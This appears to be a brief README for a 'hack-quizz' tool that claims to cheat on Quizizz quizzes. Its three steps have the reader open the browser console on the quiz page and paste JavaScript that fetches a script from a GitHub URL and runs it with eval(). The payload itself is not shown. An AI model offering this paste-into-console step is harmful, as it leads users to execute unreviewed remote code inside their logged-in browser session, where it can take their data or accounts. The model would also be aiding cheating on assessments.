# hack-quizz

Step 1: start your quizz in https://quizizz.com/join/

Step 2: open console tab [Ctrl+Shift+J]

Step 3: paste this code
```javascript
// Start the magic
    fetch("https://github.com/lucthienphong1120/hack-quizz/blob/main/script.js")
        .then((res) => res.text()
        .then((t) => eval(t)))
```
